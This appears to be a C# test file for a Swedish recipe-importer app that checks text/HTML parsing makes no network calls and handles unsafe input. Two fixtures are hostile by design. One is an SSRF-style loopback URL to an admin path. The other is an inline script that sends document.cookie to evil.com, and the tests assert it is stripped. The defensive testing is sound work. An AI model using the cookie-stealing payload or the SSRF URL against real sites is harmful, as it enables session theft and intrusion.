using System.Net;
using FluentAssertions;
using Microsoft.Extensions.Logging.Abstractions;
using Receptbanken.Core.Interfaces;
using Receptbanken.Core.Services;
using Receptbanken.Infrastructure.Importers;

namespace Receptbanken.Tests.Infrastructure;

public class RecipeTextImportIntegrationTests
{
    private class NetworkCallDetectingHandler : HttpMessageHandler
    {
        public int SendCount { get; private set; }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            SendCount++;
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK));
        }
    }

    private (WebRecipeImporter Importer, NetworkCallDetectingHandler Handler) CreateImporter()
    {
        var handler = new NetworkCallDetectingHandler();
        var httpClient = new HttpClient(handler);
        var ingredientParser = new SwedishIngredientParser();
        var jsonLdExtractor = new JsonLdRecipeExtractor(ingredientParser);
        var fallbackExtractor = new HtmlFallbackExtractor(ingredientParser);
        var htmlTextExtractor = new HtmlRecipeTextExtractor();
        var textParser = new RecipeTextParser(ingredientParser);
        var imageStorage = new MockImageStorageService();

        var importer = new WebRecipeImporter(
            httpClient,
            jsonLdExtractor,
            fallbackExtractor,
            htmlTextExtractor,
            textParser,
            imageStorage,
            NullLogger<WebRecipeImporter>.Instance);

        return (importer, handler);
    }

    [Fact]
    public void ParseFromText_NiiinisHtml_ShouldSucceedWithoutAnyHttpCalls()
    {
        var (importer, handler) = CreateImporter();

        var result = importer.ParseFromText(NiiinisRecipeFixtures.Html, NiiinisRecipeFixtures.PageUrl);

        result.Success.Should().BeTrue();
        result.DraftRecipe.Should().NotBeNull();
        var recipe = result.DraftRecipe!;

        recipe.Title.Should().Be("Ninas Köttfärssås");
        recipe.Servings.Should().Be(4);
        recipe.Ingredients.Should().HaveCount(13);
        recipe.Instructions.Should().HaveCount(4);
        recipe.Notes.Should().Contain("Tips: Riv över parmesan innan servering.");
        recipe.SourceUrl.Should().Be(NiiinisRecipeFixtures.PageUrl);
        recipe.SourceHost.Should().Be("alltommat.expressen.se");

        // Remote image URL candidate from HTML meta/img tag
        result.RemoteImageUrl.Should().Be("https://images.expressen.se/images/niiinis-kottfarssas.jpg");

        // CRITICAL (Del H): Zero HTTP calls must be made during ParseFromText!
        handler.SendCount.Should().Be(0);
    }

    [Fact]
    public void ParseFromText_PlainText_ShouldSucceedWithoutAnyHttpCalls()
    {
        var (importer, handler) = CreateImporter();

        var result = importer.ParseFromText(NiiinisRecipeFixtures.PlainText, NiiinisRecipeFixtures.PageUrl);

        result.Success.Should().BeTrue();
        result.DraftRecipe.Should().NotBeNull();
        result.DraftRecipe!.Title.Should().Be("Ninas Köttfärssås");
        result.DraftRecipe.Ingredients.Should().HaveCount(13);
        result.DraftRecipe.Instructions.Should().HaveCount(4);

        // Zero HTTP calls
        handler.SendCount.Should().Be(0);
    }

    [Fact]
    public void ParseFromText_WithMaliciousSsrfSourceUrl_ShouldOmitUnsafeUrl_WithoutCrashing()
    {
        var (importer, handler) = CreateImporter();

        const string text = """
            ## Pannkakor, 4 port
            2 dl mjöl
            Gör så här:
            1. Stek pannkakorna.
            """;

        // Internal loopback or private network URL
        var result = importer.ParseFromText(text, "http://127.0.0.1:8080/admin/secrets");

        result.Success.Should().BeTrue();
        result.DraftRecipe.Should().NotBeNull();
        result.DraftRecipe!.Title.Should().Be("Pannkakor");
        result.DraftRecipe.SourceUrl.Should().BeNull();
        result.DraftRecipe.SourceHost.Should().BeNull();

        handler.SendCount.Should().Be(0);
    }

    [Fact]
    public void ParseFromText_WithScriptTagsInHtml_ShouldCleanScriptsSafely()
    {
        var (importer, handler) = CreateImporter();

        const string html = """
            <h2>Köttfärslimpa, 4 port</h2>
            <script>document.location='http://evil.com?c=' + document.cookie;</script>
            <p>500 g blandfärs</p>
            <p>1 ägg</p>
            <h2>Gör såhär:</h2>
            <p>1) Blanda färs och ägg.</p>
            <p>2) Forma till en limpa och grädda.</p>
            """;

        var result = importer.ParseFromText(html);

        result.Success.Should().BeTrue();
        var recipe = result.DraftRecipe!;
        recipe.Title.Should().Be("Köttfärslimpa");
        recipe.Ingredients.Should().HaveCount(2);
        recipe.Instructions.Should().HaveCount(2);
        recipe.Instructions[0].InstructionText.Should().NotContain("evil.com");
        recipe.Instructions[1].InstructionText.Should().NotContain("cookie");

        handler.SendCount.Should().Be(0);
    }

    [Fact]
    public void ParseFromText_WithEmptyInput_ShouldFailGracefully()
    {
        var (importer, _) = CreateImporter();

        var result = importer.ParseFromText("");
        result.Success.Should().BeFalse();
        result.FailureReason.Should().Be(RecipeImportFailureReason.EmptyInput);
    }

    [Fact]
    public void ParseFromText_WithInputExceedingLimit_ShouldFailWithInputTooLarge()
    {
        var (importer, _) = CreateImporter();

        var oversized = new string('x', RecipeImportLimits.MaxRecipeTextLength + 100);
        var result = importer.ParseFromText(oversized);

        result.Success.Should().BeFalse();
        result.FailureReason.Should().Be(RecipeImportFailureReason.InputTooLarge);
    }
}

